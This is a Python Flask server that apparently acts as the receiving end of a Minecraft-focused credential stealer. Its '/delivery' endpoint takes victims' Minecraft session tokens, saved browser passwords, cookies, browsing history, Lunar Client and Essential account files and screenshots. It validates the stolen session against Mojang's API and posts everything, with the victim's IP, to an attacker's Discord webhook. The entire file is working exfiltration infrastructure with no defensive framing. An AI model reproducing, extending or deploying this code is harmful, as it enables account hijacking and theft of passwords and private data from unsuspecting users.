import base64
import json
import time

from discord_webhook import DiscordWebhook, DiscordEmbed
from flask import Flask, request
from flask_restful import Api, Resource
import requests

app = Flask(__name__)
api = Api(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16 MB max request size

ips = {}

with open("config.json", "r") as f:
    config = json.load(f)

def validate_session(ign, uuid, ssid):
    headers = {
        'Content-Type': 'application/json',
        "Authorization": f"Bearer {ssid}"
    }
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
    if r.status_code == 200:
        profile = r.json()
        return profile.get('name') == ign and profile.get('id') == uuid
    return False

def split_embed(embed, max_length=6000):
    fields = embed.fields
    split_embeds = []
    current_embed = DiscordEmbed(title=embed.title, color=embed.color)
    current_length = len(embed.title or "") + len(embed.description or "")

    for field in fields:
        field_length = len(field['name']) + len(field['value'])
        if current_length + field_length > max_length:
            split_embeds.append(current_embed)
            current_embed = DiscordEmbed(title=embed.title, color=embed.color)
            current_length = len(embed.title or "") + len(embed.description or "")
        inline = field.get('inline', False)
        current_embed.add_embed_field(name=field['name'], value=field['value'], inline=inline)
        current_length += field_length

    split_embeds.append(current_embed)
    return split_embeds

class Delivery(Resource):
    def post(self):
        args = request.json
        ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)

        # Rate limiting
        now = time.time()
        if ip in ips:
            if now - ips[ip]['timestamp'] > config['reset_ratelimit_after']:
                ips[ip]['count'] = 1
                ips[ip]['timestamp'] = now
            else:
                if ips[ip]['count'] < config['ip_ratelimit']:
                    ips[ip]['count'] += 1
                else:
                    return {'status': 'ratelimited'}, 429
        else:
            ips[ip] = {'count': 1, 'timestamp': now}

        webhook = DiscordWebhook(
            url=config['webhook'].replace("discordapp.com", "discord.com"),
            username=config['webhook_name'],
            avatar_url=config['webhook_avatar']
        )

        cb = '`' if config['codeblock_type'] == 'small' else '```'

        webhook.content = config['message'].replace('%IP%', ip)

        mc = args['minecraft']
        if config['validate_session'] and not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
            return {'status': 'invalid session'}, 401

        mc_embed = DiscordEmbed(title=config['mc_embed_title'], color=int(config['mc_embed_color'], 16))
        mc_embed.set_footer(text=config['mc_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
        mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
        mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
        mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)

        embeds = split_embed(mc_embed)

        for password in args.get('passwords', []):
            if 'password' not in password:
                continue
            password_embed = DiscordEmbed(title=config['password_embed_title'], color=int(config['password_embed_color'], 16))
            password_embed.set_footer(text=config['password_embed_footer_text'], icon_url=config['password_embed_footer_icon'])
            password_embed.add_embed_field(name="URL", value=cb + password['url'] + cb, inline=True)
            password_embed.add_embed_field(name="Username", value=cb + password['username'] + cb, inline=True)
            password_embed.add_embed_field(name="Password", value=cb + password['password'] + cb, inline=True)
            embeds.extend(split_embed(password_embed))

        file_embed = DiscordEmbed(title=config['file_embed_title'], color=int(config['file_embed_color'], 16))
        file_embed.set_footer(text=config['file_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
        file_embed.add_embed_field(name="Lunar Client File", value=f"{cb}Yes{cb} ✅" if 'lunar' in args else f"{cb}No{cb} ❌", inline=True)
        file_embed.add_embed_field(name="Essential File", value=f"{cb}Yes{cb} ✅" if 'essential' in args else f"{cb}No{cb} ❌", inline=True)
        embeds.extend(split_embed(file_embed))

        # Send embeds in batches
        batch_size = 10
        for i in range(0, len(embeds), batch_size):
            for embed in embeds[i:i+batch_size]:
                webhook.add_embed(embed)
            webhook.execute()
            webhook.embeds.clear()
            webhook.content = ""

        # Handle additional files
        if 'history' in args:
            history_lines = [
                f"Visit count: {entry['visitCount']}\tTitle: {entry['title']}     URL: {entry['url']}\t({entry['browser']})"
                for entry in args['history']
            ]
            webhook.add_file(file="\n".join(history_lines).encode(), filename="history.txt")

        for key, filename in [('lunar', 'lunar_accounts.json'),
                              ('essential', 'essential_accounts.json'),
                              ('cookies', 'cookies.txt'),
                              ('screenshot', 'screenshot.png')]:
            if key in args:
                try:
                    decoded = base64.b64decode(args[key])
                    webhook.add_file(file=decoded, filename=filename)
                except Exception:
                    continue

        webhook.execute()
        return {'status': 'ok'}, 200

    def get(self):
        return {'status': 'ok'}, 200

api.add_resource(Delivery, '/delivery')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80) 
